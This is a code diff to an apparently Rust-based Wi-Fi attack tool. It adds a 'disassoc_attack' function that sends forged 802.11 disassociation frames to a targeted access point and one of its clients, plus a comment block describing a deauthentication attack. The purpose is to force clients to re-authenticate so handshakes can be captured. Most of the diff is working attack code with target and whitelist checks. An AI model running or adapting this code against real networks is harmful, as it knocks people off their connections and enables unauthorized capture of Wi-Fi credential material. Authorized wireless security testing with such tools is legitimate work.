@@ -21,6 +21,7 @@ use crate::{
     tx::{
         build_association_request_rg, build_authentication_frame_noack, build_csa_beacon,
         build_deauthentication_fm_ap, build_deauthentication_fm_client,
+        build_disassocation_from_ap, build_disassocation_from_client,
         build_probe_request_undirected, build_probe_response, build_reassociation_request,
     },
     write_packet, OxideRuntime,
@@ -88,6 +89,68 @@ pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), St
                 beacon.station_info.ssid.unwrap_or("Hidden".to_string()),
                 new_channel
             ),
+        ));
+    }
+
+    Ok(())
+}
+
+//////////////////////////////////////////////////////////////
+//                                                          //
+//                 Disassociation Attack                    //
+//  This attack sends the AP/Client similar disassociation  //
+//  frames in an attempt to force a re-authentication. This //
+//  attack will only target a client of an AP and will send //
+//  the disassociation to the AP and Client simultaneously. //
+//                                                          //
+//////////////////////////////////////////////////////////////
+
+pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
+    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
+        dev
+    } else {
+        return Ok(());
+    };
+
+    if !oxide.target_data.targets.is_target(ap_data) {
+        return Ok(());
+    }
+
+    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
+        return Ok(());
+    }
+
+    if oxide
+        .handshake_storage
+        .has_complete_handshake_for_ap(ap_mac)
+    {
+        return Ok(());
+    }
+
+    if oxide.config.notx {
+        return Ok(());
+    }
+
+    let random_client = ap_data
+        .client_list
+        .get_random()
+        .map(|client| client.mac_address);
+
+    if let Some(mac_address) = random_client {
+        // Rate limit directed disassoc to every 32 beacons.
+        let deauth_client = mac_address;
+        // Deauth From AP
+        let frx =
+            build_disassocation_from_client(ap_mac, &deauth_client, oxide.counters.sequence1());
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+
+        let frx = build_disassocation_from_ap(ap_mac, &deauth_client, oxide.counters.sequence1());
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+
+        ap_data.interactions += 1;
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!("Sending Disassociation: {} <=> {}", ap_mac, deauth_client),
         ));
     }
 
@@ -251,6 +314,19 @@ pub fn m1_retrieval_attack_phase_2(
     }
     Ok(())
 }
+
+//////////////////////////////////////////////////////////////
+//                                                          //
+//                  Deauthentication Attack                 //
+//  This attack sends a standard DEAUTHENTICATION frame to  //
+//  try and force a Client to re-authenticate with an       //
+//  access point. We do this either to broadcast (targeting //
+//  all clients) or to a specific client. In the case we    //
+//  target a specific client, we also send a                //
+//  DEAUTHENTICATION frame to the Access Point              //
+//  simultaneously.                                         //
+//                                                          //
+//////////////////////////////////////////////////////////////
 
 pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
     if !oxide.config.deauth {
